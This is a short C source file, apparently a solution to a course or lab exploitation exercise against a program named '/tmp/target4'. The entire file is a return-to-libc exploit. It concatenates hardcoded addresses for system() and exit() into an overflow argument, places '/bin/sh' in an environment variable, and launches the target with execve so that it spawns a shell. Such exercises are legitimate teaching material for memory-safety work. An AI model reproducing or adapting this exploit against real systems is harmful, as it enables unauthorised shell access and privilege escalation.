#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];
  

  args[0] = TARGET;
  

  //change the address to the env
  printf("AA\n");
  char rt_arr[20] = "";
  strcat(rt_arr, "\xa0\x3d\xe4\xb7");

  //ebp
  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
  //p system 0xb7 e4 3d a0 
  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
  //p exit 0xb7 e3 79 d0
  strcat(rt_arr, "\xd0\x79\xe3\xb7");
  //argument add - 0xbf ff ff bd 
  strcat(rt_arr, "\xb9\xff\xff\xbf");
  //strcat(rt_arr, "/bin/sh");
 
 
  args[1] = rt_arr; 
  args[2] = NULL;
  
  //env[0] = NULL;
  env[0] = "YG=/bin/sh";
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


